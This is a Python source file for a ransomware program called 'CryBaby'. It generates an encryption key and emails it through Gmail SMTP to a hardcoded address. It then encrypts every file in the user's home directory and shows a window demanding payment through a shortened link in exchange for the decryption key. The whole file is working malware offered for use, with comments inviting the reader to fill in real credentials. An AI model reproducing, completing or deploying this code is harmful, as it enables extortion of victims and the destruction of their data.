from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
import os
import ssl
import platform
import tkinter
from tkinter import *
import threading
from tkinter import ttk

def sendmail(key):  # Function to send the encrypted key via email

	sender = 'scoobydoo@gmail.com'  # Change this
	receivers = 'scrappydoo@gmail.com'   # Change this
	port = 587
	msg = MIMEText(str(key)[1:])
	msg['Subject'] = ('Encryption Key for ' + platform.uname()[1])
	msg['From'] = 'scoobydoo@gmail'		# Change this
	msg['To'] = 'scrappydoo@gmail.com'	# Change this
	with smtplib.SMTP('smtp.gmail.com', 587) as server:
		context = ssl.SSLContext(ssl.PROTOCOL_TLS)
		server.starttls(context=context)
		server.login('scoobydoo@gmail.com', 'Password123')	# Change this with actual credentials
		server.sendmail(sender, receivers, msg.as_string())
		

def encryption(f):

	directory = os.environ['USERPROFILE'] + os.sep + r'\\'		# Currently encryption is done for the current users home directory. You may change this

	exclude = set(['tk', 'tcl'])
	for root, directories, filenames in os.walk(directory): 

		directories[:] = [d for d in directories if d not in exclude]

		for filename in filenames:   

		    try:
			    with open(root + "\\" + filename, 'rb') as original_file:
				    original = original_file.read()

				    encrypted = f.encrypt(original)
			  
			    with open(root + "\\" + filename, 'wb') as encrypted_file:
				    encrypted_file.write(encrypted) 

		    except:
		    	pass

def decryption(key):

	try:		
		global root
		progressbar.start()
		directory = os.environ['USERPROFILE'] + os.sep + r'\\'		# Decryption of same directories used in encryption

		for main, directories, filenames in os.walk(directory):  
			    
			for filename in filenames:  
			     
			    root.update()
			    try:
			    
				    with open(main + "\\" + filename, 'rb') as encrypted_file:
					    encrypted = encrypted_file.read()

					    decrypted = key.decrypt(encrypted)
				    
				    with open(main + "\\" + filename, 'wb') as decrypted_file:
					    decrypted_file.write(decrypted) 

			    except:
			    	pass

		root2 = tkinter.Tk()
		root2.title('CryBaby - Complete!')
		root2.geometry("500x150")
		complete = "\n\nYour Files have been succesfully decrypted! \nPleasure doing business with you!"
		myLabel = Label(root2, font=('Helvetica', 10), text=complete)
		myLabel.pack(pady=10)

	except:

		root3 = tkinter.Tk()
		root3.title('CryBaby! - Invalid!')
		root3.geometry("500x150")
		complete = "\n\nInvalid Decryption Key!"
		myLabel = Label(root3, font=('Helvetica', 10), text=complete)
		myLabel.pack(pady=10)


def start_new_thread(): 
    global new_thread
    global root
    key = Fernet(str(e.get()))
    warning = "Please wait while the decryption completes! \nIf you close this wizard you will loose your data forever!!"
    myLabel = Label(root, font=('Helvetica', 12), text=warning)
    myLabel.pack(pady=10)
    new_thread = threading.Thread(target=decryption(key))
    new_thread.daemon = True
    new_thread.start()
    root.after(100, check_new_thread)

def check_new_thread():
    if new_thread.is_alive():
	
	    root.after(100, check_new_thread)

    else:
        progressbar.stop()

if __name__ == "__main__":

	key = Fernet.generate_key()
	f = Fernet(key)
	sendmail(key)
	encryption(f)
	global root
	root = tkinter.Tk()
	root.title('CryBaby!')
	warning = "\nCrybaby!"
	myLabel = Label(root, font=('Helvetica', 20), text=warning)
	myLabel.pack(pady=10)
	notice = "\n\nNo Backups? Better start crying as we encrypted all your data!\nDO NOT Close this if you want your data back!!\n\nFollow the link 'https://bit.ly/3lkrBtD' to make the payment"
	myLabel1 = Label(root, font=('Helvetica', 16), text=notice)
	myLabel1.pack(pady=10)
	decrypt = "\nEnter the decryption key below:\n"
	myLabel2 = Label(root, font=('Helvetica', 10), text=decrypt)
	myLabel2.pack(pady=10)
	root.geometry("600x550")
	e = Entry(root, width=50, font=('Helvetica', 10))
	e.pack(padx=10, pady=10)
	frame = ttk.Frame(root)
	frame.pack()
	progressbar = ttk.Progressbar(frame, orient="horizontal",length=400, mode='indeterminate')
	progressbar.grid(column=1, row=0, sticky=W)
	mybutton = Button(root, font=('Helvetica', 14), text="Enter", command=start_new_thread)	
	mybutton.pack(pady=10)
	root.mainloop()

